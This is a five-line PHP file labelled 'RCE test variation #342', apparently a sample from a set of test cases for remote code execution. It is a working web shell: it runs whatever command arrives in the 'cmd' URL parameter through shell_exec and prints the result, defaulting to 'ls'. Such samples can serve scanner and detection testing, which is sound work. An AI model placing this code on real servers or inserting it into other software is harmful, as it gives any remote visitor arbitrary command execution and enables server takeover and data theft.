<?php
// RCE test variation #342
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>